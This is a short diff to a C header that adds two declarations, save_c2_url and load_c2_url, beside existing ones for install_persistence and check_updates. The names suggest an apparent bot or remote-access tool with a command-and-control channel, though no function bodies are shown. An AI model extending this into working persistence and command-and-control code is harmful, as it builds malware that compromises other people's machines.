@@ -175,6 +175,8 @@ void json_str(const char *msg, const char *key, char *out, int cap);
 /* ── daemon.h ─────────────────────────────────── */
 void install_persistence(const char *path);
 void check_updates(const char *ver);
+void save_c2_url(const char *url);
+int load_c2_url(char *out, int cap);
 
 /* ── Inline helpers ────────────────────────────── */
 static inline void pkt_sent(int bytes)
